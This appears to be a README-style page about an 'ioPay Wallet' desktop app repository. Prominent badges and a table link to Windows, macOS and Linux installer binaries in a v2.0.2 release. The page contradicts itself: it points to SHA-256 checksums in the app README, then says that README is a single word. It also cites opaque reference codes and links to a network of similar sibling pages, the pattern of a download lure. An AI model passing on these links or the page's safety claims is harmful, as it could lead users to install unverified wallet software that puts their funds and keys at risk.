![ioPay Wallet: desktop wallet guide](assets/banner-article.png)

# The ioPay Wallet Repository, Explained

The ioPay Wallet repository is **public**, and it is where the code, the licence and the releases live (F002). It is also a repository that will mislead you if you read it the way a developer would read a documented project - so this page is a map of what is there, what is not, and which part to trust for which question.

<p align="center"><a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe"><img src="https://img.shields.io/badge/DOWNLOAD-WINDOWS-0969da?style=for-the-badge&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-0969da?style=for-the-badge&labelColor=0B1733&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-0969da?style=for-the-badge&labelColor=0B1733&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
|---|---|---|
| ![Windows](https://img.shields.io/badge/platform-Windows-0969da?style=flat-square&labelColor=0B1733&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B&logoColor=white) | Windows 10 (1909) or later, 64-bit | [iopay-wallet-desktop-win-v2.0.2.exe](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-win-v2.0.2.exe) |
| ![macOS](https://img.shields.io/badge/platform-macOS-0969da?style=flat-square&labelColor=0B1733&logo=apple&logoColor=white) | macOS 12 or later | [iopay-wallet-desktop-macos-v2.0.2.dmg](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-macos-v2.0.2.dmg) |
| ![Linux](https://img.shields.io/badge/platform-Linux-0969da?style=flat-square&labelColor=0B1733&logo=linux&logoColor=white) | x64, Ubuntu 20.04 or later, or equivalent | [iopay-wallet-desktop-linux-v2.0.2.zip](https://github.com/iopay-project/iopay-desktop-wallet/releases/download/v2.0.2/iopay-wallet-desktop-linux-v2.0.2.zip) |

</div>

All three files and their sizes are on the [ioPay Wallet v2.0.2 release page](https://github.com/iopay-project/iopay-desktop-wallet/releases/tag/v2.0.2); their SHA-256 values are published in the [app README](https://github.com/iopay-project/iopay-desktop-wallet).

> **Only download from this GitHub release page.** A build offered anywhere else is not this release, whatever name it carries.

## What is in it

**Code.** A monorepo built on a staking codebase (F009), with the desktop wallet among its workspaces.

**A licence.** Apache-2.0 (F005). This is the single most useful file for anyone deciding whether they may inspect or reuse the code, and it is unambiguous.

**Releases.** Tags with assets, which is where version truth lives.

**A branch called `audit/hacken`** (F017) - a branch, not a published report.

## What is not in it

**Documentation.** The `README.md` is a single word (F008). There are no install instructions, no configuration guide and no user manual in the repository.

**An issue tracker with history.** No open or closed issues (F049). That means no bug list, no support threads, and no way to see whether your problem is known.

**A usable changelog.** `CHANGELOG.md` is generated from an upstream codebase and documents a different product's history (F007). It is not ioPay's history, and version claims taken from it will be wrong.

**Release notes.** The release body repeats the title only (F006). There is no "what's new" text to read.

**An audit report.** The branch exists; the report does not (F017).

## How to read it for the four questions people actually have

**"Which version should I install?"** -> Releases. The current one is **v2.0.2, 19 November 2026**, and the asset names carry the version. Do not use the changelog. [Version page](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-versions-and-release-notes.md).

**"Can I inspect or reuse the code?"** -> `LICENSE`. Apache-2.0 permits both, under its terms. [Open source page](https://github.com/iopay-project/desktop-setup-and-safety/blob/main/open-source-code-behind-iopay-wallet.md).

**"Has it been audited?"** -> The branch name is the only artifact. No scope, no date, no findings. Treat the branch as a work-in-progress signal, not a result.

**"Where do I report a problem?"** -> The repository is the public surface, but with no issue history there is no queue to join. [Getting help](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/how-to-get-help-with-iopay-wallet.md) covers what to do instead.

## The third-party trap

There is a site that publishes ioPay desktop reviews, and it is **not** this project: it is not a release channel, and its version references are already behind (F048). Reviews can be useful for a second opinion; they cannot substitute for the release page when the question is "what am I installing".

The general test: **does the source point at an artifact you can open** - a release, a licence, a branch, a report? If it only points at itself, it is commentary.

## Why a thin repository is not automatically bad

A public repo with no README and no issues is a strange thing to find in 2026, and it is fair to read it as a signal about how the project is maintained. What it is not is evidence about the code's behaviour, and it is not a reason to distrust a release you can read.

The useful position is the boring one: **use the releases for versions, the licence for permissions, and the code for questions that need code.** Everything else on that page is either absent or belongs to someone else.

If the open question is whether to use the wallet at all, a repository cannot answer it: [choosing a first wallet](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-for-beginners-choosing-a-first-defi-wallet.md) works through the criteria instead.

## FAQ

**Where is the ioPay Wallet code and issue tracker?**
The code is in the public repository (F002). There is an issues tab, but it has no open or closed issues.

**Is the README useful?**
No - it is a single word.

**Is the changelog accurate?**
No. It documents another codebase's history.

**Does the repository prove an audit happened?**
It shows an `audit/hacken` branch. No report is published.

**Where do I download the wallet?**
The releases page. [Which build is current](https://github.com/iopay-project/choosing-the-right-wallet/blob/main/iopay-wallet-and-earlier-desktop-builds.md).

## What the licence gives you, and what it does not

Apache-2.0 is the most useful file in the repository (F005), and it is worth being precise about what it settles.

**It gives you** the right to read the code, to modify it, and to redistribute it under the licence's terms, including the patent grant and the attribution requirements. For anyone deciding whether they may inspect or reuse the work, that is the whole answer, and it does not depend on anyone's permission.

**It does not give you** a warranty, a support commitment, or any statement that the software is fit for a particular purpose. It also says nothing about who endorses the project: a permissive licence is a grant of rights, not a badge of approval (F041).

That is why "the code is public and Apache-2.0" is the strongest verifiable claim on this page. It is a fact you can check by opening one file, and it is stronger than any description of the project's status.

## Three claims, and the one place each can be checked

| Claim | Where it can be checked | What it cannot tell you |
|---|---|---|
| Which version exists | the release tag and asset names | what changed in it |
| What you may do with the code | `LICENSE` | whether anyone endorses it |
| Whether a problem is known | nothing in the repository (F049) | whether it will be fixed |

Reading that table the other way round is the useful habit: any statement about this project that cannot be traced to one of those three places - or to the app's behaviour - is commentary, however confidently it is written.


---

*Repository contents, branch, licence and tracker state follow F002/F005/F006/F007/F008/F009/F017/F049; third-party review site from F048.*
